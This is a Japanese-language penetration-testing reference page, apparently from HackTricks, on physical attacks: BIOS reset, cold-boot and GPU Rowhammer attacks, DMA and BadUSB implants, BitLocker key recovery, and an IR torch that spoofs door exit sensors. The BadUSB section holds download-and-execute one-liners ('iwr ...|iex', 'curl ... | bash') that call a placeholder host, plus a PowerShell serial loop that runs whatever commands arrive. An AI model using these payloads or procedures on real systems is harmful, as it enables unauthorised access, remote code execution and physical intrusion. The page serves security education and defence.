# 物理攻撃

{{#include ../banners/hacktricks-training.md}}

## BIOSパスワードの復旧とシステムセキュリティ

レガシーPCのファームウェア設定は、CMOSバッテリーを取り外すか、マニュアルに記載されたClear-CMOSジャンパーを使用してリセットできる場合があります。必要な電源オフ時間はマザーボードによって異なります。また、最新のUEFIパスワードや鍵は不揮発性フラッシュメモリ、組み込みコントローラー、またはセキュリティデバイスに保存されている場合があり、バッテリーを取り外しても消去されないことがあります。ピンを短絡する前に、マザーボードまたはサービスマニュアルを確認してください。この手順によってTPMの測定値が無効になり、ディスク暗号化のリカバリーが必要になることもあります。

レガシーx86システムでは、**killCMOS**や**CmosPwd**などのツールを使い、起動可能な環境からCMOSに保存された設定を確認または変更できます。CmosPwdは、文書化された旧式BIOSファミリーのパスワード形式を認識し、CMOSの状態をバックアップ、復元、または消去・破棄できます。公開されているビルドは、レガシーなDOS/Windows、Linux、FreeBSD、NetBSD環境を対象としています。<sup>[[18]](#references)</sup> これらのユーティリティは汎用のUEFIパスワード解除ツールではなく、十分なハードウェア／ファームウェアへのアクセスが必要です。

一部のノートPCのファームウェアでは、パスワードの入力に何度か失敗すると、ベンダー固有のチャレンジコードが表示されます。[bios-pw.org](https://bios-pw.org)などのデータベースでは、一部モデル向けにレガシーなベンダーのリカバリーパスワードを導出できますが、導出可能なチャレンジコードを使わずにロックアウトするシステムも多くあります。生成されたパスワードはモデル固有のものとして扱い、回数制限によって永久にロックされるまで試行しないでください。

### UEFIセキュリティ

最新の**UEFI**システムでは、CHIPSECを使ってSecure Boot変数の保護を監査できます。まず、以下の変更を加えないチェックを実行してください。オプションの`-a modify`モードは意図的に変数の破損を試みるため、復旧可能なラボシステムでのみ使用してください。CHIPSEC自体も、特権ドライバーと低レベルのハードウェアアクセスは本番環境のエンドポイントには適さないと警告しています。<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## RAM解析とCold-boot attack

DRAMは、リフレッシュが停止してもすべてのビットが直ちに失われるわけではありません。データの消失速度はモジュールの技術や温度によって大きく異なり、冷却すれば、冷却しない状態で電源を再投入する場合よりも、はるかに長く有用なデータを保持できます。Cold-boot attackでは、小規模な取得環境へすばやく再起動するか、冷却したモジュールを別の環境へ移し、rawメモリを取得して、ビットの消失があっても暗号鍵を再構築します。ディスクコピー用ユーティリティが自動的に物理メモリのイメージ取得ツールになるわけではなく、Volatilityは取得ではなくキャプチャの解析を行います。プラットフォームに適した、検証済みの取得ツールを使用してください。<sup>[[12]](#references)</sup>

---

## ページテーブルを狙うGPU Rowhammer

最新のGPU Rowhammer攻撃は、通常のバッファではなく、**GPU仮想メモリのメタデータ**を標的にすると、はるかに有効になります。**GDDR6を搭載したNVIDIA Ampere GPU**に関する最近の研究では、権限のないCUDAコードを実行する攻撃者が、GPU固有のhammeringパターンを構築し、**memory massaging**を利用してページング構造を脆弱な行に配置したうえで、**最終レベルのページテーブル**または中間の**ページディレクトリ**のビットを反転できることが示されています。単一の変換エントリが破損すると、攻撃者は**任意のGPUメモリの読み書き**を実現し、そこからホストの侵害へと進めます。<sup>[[1]](#references)[[2]](#references)</sup>

### Exploitation Pattern

1. GDDR6内で**hammering可能な行を特定**し、DRAM内の緩和策を回避する、リフレッシュを考慮した不均一なhammeringパターンを構築します。
2. **GPU割り当てを操作**して、ドライバーがページ変換構造をデフォルトの保護プールに置かず、hammering可能な物理位置に配置するようにします。実際には、低メモリのページテーブル領域を使い切り、制御したstrideで大規模な疎なUVMマッピングを大量に作成する方法があります。
3. ページテーブルまたはページディレクトリエントリ内の**PFN**やアパーチャ関連ビットなどの**変換メタデータを反転**させ、攻撃者が制御する仮想ページをページテーブルページ、任意のGPUメモリ、またはホストから見えるシステムマッピングに解決させます。
4. 偽造したマッピングを再利用して追加の変換エントリを書き換え、GPUコンテキストをまたいだ**任意のGPUメモリの読み書き**へと権限を拡大します。

### ホストへのピボットと緩和策

- **IOMMUが無効**の場合、偽造したシステムアパーチャマッピングによって、GPUから任意の**ホスト物理メモリ**を参照できるようになり、GPUのプリミティブがホストの完全な侵害につながります。<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer**は最終レベルのページテーブルエントリを標的とします。一方、**GeForge**は、1ビットの反転でより大きな変換サブツリーの参照先を変更できるため、ページディレクトリレベルの破損のほうが容易な場合があることを示しています。ページング層のうち1つだけをセキュリティ上重要と見なさないでください。<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU**は、GDDRHammer/GeForgeが使うホストメモリへの直接アクセス経路を遮断するため、依然として重要ですが、**完全な緩和策ではありません**。**GPUBreach**は、攻撃者がGPUから書き込み可能なドライバー所有のCPUバッファを破損し、さらにNVIDIAドライバーのメモリ安全性バグを誘発するという、第2段階のピボットを示しています。これにより、IOMMUが有効でもカーネル書き込みプリミティブと**root shell**を取得できます。<sup>[[3]](#references)</sup>
- 対応するワークステーション／サーバーGPUでは、**システムレベルECC**が実用的な強化策です。ECC非対応のコンシューマーGPUでは、防御できる範囲がより限られます。<sup>[[4]](#references)</sup>
- これらの攻撃は純粋な理論上のものではありません。**GeForge**はRTX 3060で**1,171**件、RTX A6000で**202**件のビット反転を報告しており、ホスト権限昇格につながる実用的な攻撃チェーンの構築に十分でした。<sup>[[2]](#references)[[9]](#references)</sup>

---

## Direct Memory Access (DMA)攻撃

プリブート時のIOMMU適用を弱めてWindows DMA攻撃チェーンを可能にする、オフラインでのUEFI IFR/NVRAMパッチについては、以下を参照してください。

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception**は、FireWireや初期のThunderbolt構成などのインターフェースを介した**DMAベースのメモリ取得とパッチ適用**を実証しており、過去に使われたログインバイパスの手法も含まれます。これは単に「Windows 10には効果がない」というものではありません。悪用可能性は、インターフェース、対象ビルド、IOMMUポリシー、ロック状態、Windows Kernel DMA Protectionのサポートと有効化の有無によって異なります。Windows 10 version 1803以降では、互換性のあるプラットフォームでKernel DMA Protectionが導入され、攻撃対象領域が大きく変わりました。<sup>[[13]](#references)[[14]](#references)</sup>

---

## システムアクセスのためのLive CD/USB

暗号化されていない、またはすでにロック解除されたWindowsボリュームでは、オフライン環境を使って**sethc.exe**や**Utilman.exe**などのアクセシビリティバイナリを**cmd.exe**に置き換え、対応するログオン画面のショートカットを実行したときにSYSTEMのコマンドプロンプトを起動できます。**chntpw**などのツールを使えば、ローカルSAMアカウントのデータを編集できます。これらの方法は、ロックされたBitLockerボリュームをバイパスするものではなく、DPAPI/EFSで保護された認証情報を損傷するおそれがあります。フォレンジック用コピーとバックアップを保管してください。

**Kon-Boot**は、対応するWindows/macOS構成で利用できる商用のブート時認証バイパスツールです。互換性はOS、ファームウェアモード、Secure Boot、ディスク暗号化の構成によって異なり、BitLockerでロックされたボリュームを復号することはできません。<sup>[[10]](#references)</sup>

---

## Windowsのセキュリティ機能への対処

### ブートおよびリカバリー用ショートカット

- **Delete/Supr**、F2、F10、またはメーカー指定の別のキーで、ファームウェア設定を開ける場合があります。
- **F8**で従来のWindows詳細ブートオプションを開けるのは、その経路が引き続き有効な構成に限られます。現在のリカバリーへのアクセス方法は構成によって異なります。
- **Shift**を押し続けると、一部の構成ではWindowsの自動ログオンを抑止できます。ただし、ポリシーやレジストリの設定でこの動作が無効化されている場合があります。<sup>[[17]](#references)</sup>

### BAD USBデバイス

**USB Rubber Ducky**やTeensyボードなどのデバイスは、信頼されたHIDキーボードとして認識され、あらかじめ定義されたキー入力を注入できます。ペイロードは、最初はログオン中のセッションと同じ権限およびデスクトップアクセスを持ちますが、UACプロンプト、画面ロック、キーボードレイアウト、タイミング、エンドポイントのUSBポリシーによる制約を受けます。<sup>[[15]](#references)</sup>

### Volume Shadow Copy

管理者権限またはバックアップ権限があれば、シャドウコピーを作成したりレジストリハイブを保存したりして、**SAM**や**SYSTEM**などのロックされたファイルを取得できます。これは侵害後の収集手法であり、権限をバイパスするものではありません。`diskshadow`/VSSのイベントやレジストリハイブのエクスポートイベントと照合してください。

## BadUSB / HID Implant Techniques

### Wi-Fi managed cable implants

- **Evil Crow Cable Wind**などのESP32-S3ベースのインプラントは、USB-A→USB-CまたはUSB-C↔USB-Cケーブル内に隠され、USBキーボードとしてのみ認識され、Wi-Fi経由でC2スタックを公開します。オペレーターは、被害者のホストからケーブルに給電し、パスワードを`123456789`に設定した`Evil Crow Cable Wind`という名前のホットスポットを作成して、[http://cable-wind.local/](http://cable-wind.local/)（またはDHCPアドレス）を開くだけで、組み込みHTTPインターフェースにアクセスできます。<sup>[[8]](#references)</sup>
- ブラウザーUIには、*Payload Editor*、*Upload Payload*、*List Payloads*、*AutoExec*、*Remote Shell*、*Config*のタブがあります。保存されたペイロードにはOSごとのタグが付き、キーボードレイアウトは実行時に切り替えられ、VID/PID文字列は既知の周辺機器を装うよう変更できます。
- C2がケーブル内にあるため、組織のネットワークを使わずに、スマートフォンからペイロードの準備、実行の指示、Wi-Fi認証情報の管理ができます。これは、物理的侵入の滞在時間が短い場合に有用です。

### OS-aware AutoExec payloads

- AutoExecルールでは、1つ以上のペイロードをUSBの列挙直後に実行するよう設定できます。インプラントは簡易的にOSをフィンガープリントし、一致するスクリプトを選択します。
- ワークフローの例:
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
  - *macOS/Linux:* `COMMAND SPACE`（Spotlight）または`CTRL ALT T`（ターミナル）→ `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- 実行が自動で行われるため、充電ケーブルを差し替えるだけで、ログオン中のユーザー権限で「plug-and-pwn」による初期アクセスを実現できます。

### Wi-Fi TCP経由のHID起動リモートシェル

1. **Keystroke bootstrap:** 保存されたペイロードでコンソールを開き、新しいUSBシリアルデバイスから届いた内容を実行するループを貼り付けます。Windowsでの最小構成の例は次のとおりです。

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **ケーブルブリッジ:** implantはUSB CDC channelを開いたまま、ESP32-S3からoperatorへのTCP client（Python script、Android APK、またはdesktop executable）を起動します。TCP sessionに入力されたバイト列は上記のserial loopに転送されるため、air-gapped hostでもremote command executionが可能です。出力は限られているため、operatorは通常、結果を確認せずにコマンド（account creation、追加ツールのstagingなど）を実行します。

### HTTP OTA update surface

- 文書化されているEvil Crow Cable Wind interfaceは、認証不要のfirmware-update endpoint `/update` を公開しています:<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- 現場オペレーターは、ケーブルを開けずに実行中の作戦中でも機能をホットスワップできます（例：USB Army Knife firmwareをフラッシュする）。これにより、implantは対象ホストに接続したまま、新たな機能へピボットできます。

## BitLocker暗号化のバイパス

稼働中または最近稼働していたシステムを承認を得てフォレンジック取得すると、ボリュームがロック解除されている間に、BitLockerのボリュームマスターキーや関連する鍵素材が含まれている場合があります。Elcomsoft Forensic Disk DecryptorやPassware Kit Forensicなどの商用ツールは、対応するメモリイメージ、休止状態ファイル、クラッシュダンプを検索できますが、成功するとは限りません。最新のWindowsでは、BitLockerが有効な場合、クラッシュダンプも暗号化されます。また、保存された48桁の回復パスワードは、メモリ内のボリュームキーとは別のデータです。<sup>[[12]](#references)[[16]](#references)</sup>

---

## 回復キー追加のためのソーシャルエンジニアリング

攻撃者は、管理者を説得してBitLocker管理コマンドを実行させることで、回復パスワード、外部キー、または別のプロテクターを追加し、それを取得できます。回復パスワードに任意のゼロ列を指定することはできません。BitLockerの数値回復パスワードは、検証済みの48桁形式である必要があります。承認された管理で使用する構文は `manage-bde -protectors -add C: -recoverypassword` です。追加されたプロテクターは `manage-bde -protectors -get C:` で一覧表示できます。プロテクターの追加を監視し、新しい回復用データが承認済みの場所にのみ保管されるようにしてください。<sup>[[16]](#references)</sup>

---

## 筐体侵入スイッチ／メンテナンススイッチを悪用したBIOSの工場出荷時リセット

最新のノートPCや小型デスクトップの多くには、Embedded Controller（EC）とBIOS/UEFI firmwareが監視する**筐体侵入スイッチ**が搭載されています。スイッチの主な目的は、デバイスが開かれたときに警告を発することですが、ベンダーによっては、スイッチを特定のパターンで切り替えると作動する**文書化されていない復旧ショートカット**を実装していることがあります。<sup>[[5]](#references)[[6]](#references)</sup>

### 攻撃の仕組み

1. スイッチはECの**GPIO割り込み**に接続されています。
2. EC上で動作するfirmwareは、**押された間隔と回数**を記録します。
3. ハードコードされたパターンが認識されると、ECは*mainboard-reset*ルーチンを実行し、**システムのNVRAM/CMOSの内容を消去**します。
4. 次回の起動時に、該当モデルはリセットされたfirmware状態を読み込みます。ベンダーやリビジョンによっては、消去される状態に、スーパーバイザーパスワード、カスタム起動設定、登録済みのSecure Bootキーが含まれる場合があります。TPMの状態とディスク暗号化への影響は、別途評価する必要があります。

> firmwareのリセットによって外部起動オプションが復元されることはありますが、ストレージが**復号されるわけではありません**。BitLockerなどのフルディスク暗号化システムは、TPM/firmwareの変更後に回復モードになることがありますが、回復キーがなければ内蔵ドライブは引き続き保護されます。<sup>[[16]](#references)</sup>

### 実例 – Framework 13 Laptop

Framework 13（第11/12/13世代）の復旧ショートカットは次のとおりです。

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

10サイクル目の後、ECは次回の再起動時にBIOSがNVRAMを消去するよう指示するフラグを設定します。全手順にかかる時間は約40秒で、必要なのは**ドライバーだけ**です。<sup>[[5]](#references)</sup>

### 一般的なExploit手順

1. ECが動作している状態にするため、対象デバイスの電源を入れるか、サスペンドから復帰させます。
2. 底面カバーを外し、侵入検知／メンテナンススイッチを露出させます。
3. ベンダー固有の切り替えパターンを再現します（ドキュメントやフォーラムを参照するか、ECファームウェアをリバースエンジニアリングします）。
4. 再組み立てして再起動し、実際に変更されたファームウェア設定と認証情報を確認します。
5. 許可されており、外部ブートが可能な場合は、管理下のLiveイメージから起動します。内蔵ボリュームが正規の手順でアンロックされた後（または暗号化されていなかった場合）、Live環境から認証情報やデータを取得したり、EFI System Partitionを調査したりできます。このパーティションを変更してEFI implantをインストールする行為は、永続的かつ非常に侵襲的であり、Secure Boot、measured boot、ファームウェアの書き込み保護、エンドポイント監視による制約を受けます。暗号化されたストレージには、キーまたはリカバリー情報がなければアクセスできません。

### 検知と緩和策

* OSの管理コンソールで筐体侵入イベントを記録し、予期しないBIOSリセットと相関付けます。
* 開封を検知できるよう、ネジやカバーに**開封検知シール**を使用します。
* デバイスを**物理的に管理されたエリア**に保管し、物理アクセスは完全な侵害と同等だと想定します。
* 利用可能な場合は、ベンダーの「maintenance switch reset」機能を無効にするか、NVRAMリセットに追加の暗号学的認証を必須にします。

---

## 非接触退出センサーに対するCovert IR Injection

### センサーの特性
- 市販の「wave-to-exit」センサーは、近赤外線LEDエミッターとTVリモコン用のような受信モジュールを組み合わせています。受信モジュールは、正しい搬送波（約30 kHz）のパルスを複数回（約4～10回）受信した場合にのみ、ロジックHighを出力します。<sup>[[7]](#references)</sup>
- プラスチック製の覆いによってエミッターと受信機が互いを直接見られないため、コントローラーは検証済みの搬送波が近くの反射によるものだと判断し、ドアの電気錠を開くリレーを駆動します。
- コントローラーが対象物の存在を検知すると、送信する変調エンベロープを変更することがよくありますが、受信機はフィルターを通過した搬送波に一致するバーストを引き続き受け付けます。

### 攻撃の手順
1. **発光プロファイルを取得する** — コントローラーのピンにロジックアナライザーを接続し、内蔵IR LEDを駆動する検知前と検知後の両方の波形を記録します。
2. **「検知後」の波形だけを再生する** — 標準のエミッターを取り外すか無視し、最初からトリガー後のパターンで外部IR LEDを駆動します。受信機はパルス数と周波数しか見ていないため、偽装した搬送波を本物の反射として扱い、リレーラインをアサートします。
3. **送信をゲート制御する** — 調整したバースト（例：数十ミリ秒のオンと、同程度のオフ）で搬送波を送信し、受信機のAGCや干渉処理ロジックを飽和させずに必要最小限のパルス数を届けます。連続して発光するとセンサーの感度がすぐに低下し、リレーが作動しなくなります。

### 長距離の反射を利用したInjection
- 卓上用LEDを高出力IRダイオード、MOSFETドライバー、集光光学系に置き換えると、約6 m離れた場所から安定してトリガーできます。
- 攻撃者は受信機の開口部を見通せる必要はありません。ガラス越しに見える室内の壁、棚、ドア枠にビームを当てれば、反射光が約30°の視野に入り、近距離で手を振ったように見せられます。
- 受信機は弱い反射光を想定しているため、より強い外部ビームで複数の面を反射させても、検知しきい値を上回ることができます。

### Weaponised Attack Torch
- ドライバーを市販の懐中電灯に組み込めば、ツールを目立たずに持ち運べます。可視光LEDを受信機の帯域に合う高出力IR LEDに交換し、ATtiny412（または同等品）で約30 kHzのバーストを生成し、MOSFETでLED電流をシンクします。
- 伸縮式ズームレンズでビームを絞り、MCU制御の振動モーターで、可視光を発さずに変調が有効であることを触覚で知らせます。
- 複数の保存済み変調パターン（わずかに異なる搬送波周波数とエンベロープ）を切り替えると、ブランド名の異なるセンサー製品群への互換性が高まります。リレーの作動音が聞こえてドアが解錠されるまで、反射面に向けて順に試せます。

---

## References

- [1] [GDDRHammer: DRAM行を大きく乱す — 最新GPUからのコンポーネント横断Rowhammer攻撃](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: GDDRメモリをハンマーしてGPUページテーブルを偽造する方法](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Rowhammerを利用したGPUへの権限昇格攻撃](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - セキュリティ通知: Rowhammer - 2025年7月](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – 「Framework 13. ここを押してpwn」](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – マザーボードのリセットガイド](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – 「Noooooooo Touch! – Covert IR TorchによるIR非接触退出センサーの回避」](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – 「挿して、実行して、pwn: Evil Crow Cable Windを使ったハッキング」](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - NVIDIAチップに対するRowhammer攻撃](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Kon-Boot公式ドキュメントと互換性情報](https://kon-boot.com/)
- [11] [CHIPSECドキュメント - Secure Boot変数の保護](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Lest We Remember: 暗号化キーに対するコールドブート攻撃](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - DMA経由の物理メモリ操作](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Kernel DMA Protection](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Hak5 USB Rubber Duckyドキュメント](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - BitLocker操作ガイド](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - Shiftキーを押し続ける操作と自動ログオンの動作](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - CmosPwdのドキュメントとダウンロード](https://www.cgsecurity.org/wiki/CmosPwd)
{{#include ../banners/hacktricks-training.md}}
